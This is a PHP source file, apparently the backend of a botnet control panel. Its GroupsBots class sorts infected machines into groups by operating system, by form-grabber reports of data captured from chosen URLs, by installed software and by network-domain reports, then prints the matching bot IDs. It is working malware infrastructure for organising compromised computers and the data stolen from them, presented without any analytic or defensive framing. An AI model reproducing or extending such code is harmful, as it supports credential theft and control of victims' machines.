<?php

class GroupsBots
{
    static private $pdo;
    static private $dbh;

    static public function UpdateGroups()
    {
        $array_bot_id = [];
        $array_bot_id_1 = [];
        $array_bot_id_2 = [];
        $array_bot_id_3 = [];

        $list_groups = GroupsBots::getDB()->queryRows('SELECT * FROM `group_bots`');
        foreach ($list_groups as $group => $value) {
            $name_group = $value['name_group'];
            $list_os = explode(',', $value['list_os']);
            $list_http_grabber = explode(',', $value['list_url_form_grabber']);
            $list_software = explode(',', $value['list_install_app']);
            $list_netview = explode(',', $value['list_domain_netview']);

            foreach ($list_os as $os => $value_os) {
                $list_bots = GroupsBots::getDB()->queryRows('SELECT * FROM `bots` WHERE `os`=:os', array(':os' => $value_os));

                if (!empty($list_bots)) {
                    foreach ($list_bots as $bot => $value_bots) {
                        array_push($array_bot_id, $value_bots['id']);
                    }
                }
            }

            foreach ($list_http_grabber as $url) {
                foreach ($array_bot_id as $bot_id) {
                    $bot_report_http_grabber = GroupsBots::getDB()->queryRows('SELECT * FROM `reports_http_grabber` WHERE `bot_id`=:id AND `url`=:url', array(':id' => $bot_id, ':url' => $url));

                    if (!empty($bot_report_http_grabber)) {
                        foreach ($bot_report_http_grabber as $value) {
                            array_push($array_bot_id_1, $value['bot_id']);
                        }
                    }
                }
            }

            foreach ($list_software as $software) {
                foreach ($array_bot_id as $bot_id) {
                    $bot_report_software = GroupsBots::getDB()->queryRows('SELECT * FROM `reports_software` WHERE `bot_id`=:id AND `name`=:software', array(':id' => $bot_id, ':software' => $software));

                    if (!empty($bot_report_software)) {
                        foreach ($bot_report_software as $value) {
                            array_push($array_bot_id_2, $value['bot_id']);
                        }
                    }
                }
            }

            foreach ($list_netview as $netview_domain) {
                foreach ($array_bot_id as $bot_id) {
                    $bot_report_netview = GroupsBots::getDB()->queryRows('SELECT * FROM `reports_netview_info` WHERE `bot_id`=:id AND `domain_name`=:domain_name', array(':id' => $bot_id, ':domain_name' => $netview_domain));

                    if (!empty($bot_report_netview)) {
                        foreach ($bot_report_netview as $value) {
                            array_push($array_bot_id_3, $value['bot_id']);
                        }
                    }
                }
            }


            #echo $name_group.'</br>';
            #var_dump($array_bot_id_1);
            #var_dump($array_bot_id_2);
            if (!empty($array_bot_id_3) && !empty($array_bot_id_2) && !empty($array_bot_id_1)) {
                #echo $name_group . '</br>' . var_dump($array_bot_id_1);
                #echo $name_group . '</br>' . var_dump($array_bot_id_2);
                echo $name_group . '</br>' . var_dump($array_bot_id_3);
            }
            $array_bot_id_1 = [];
            $array_bot_id_2 = [];
            $array_bot_id_3 = [];
        }
        #var_dump($array_bot_id);
        #var_dump($array_bot_id_1);
        #var_dump($array_bot_id_2);
        #var_dump($array_bot_id_3);


    }

    static private function getDB()
    {
        if (isset(GroupsBots::$dbh) && !empty(GroupsBots::$dbh)) {
            return GroupsBots::$dbh;
        } else {
            GroupsBots::$pdo = new PDO(DATABASE_SOURCE_NAME, DATABASE_USER_NAME, DATABASE_USER_PASSWORD);
            GroupsBots::$dbh = new Db(GroupsBots::$pdo);
            return GroupsBots::$dbh;
        }
    }
}

GroupsBots::UpdateGroups();

?>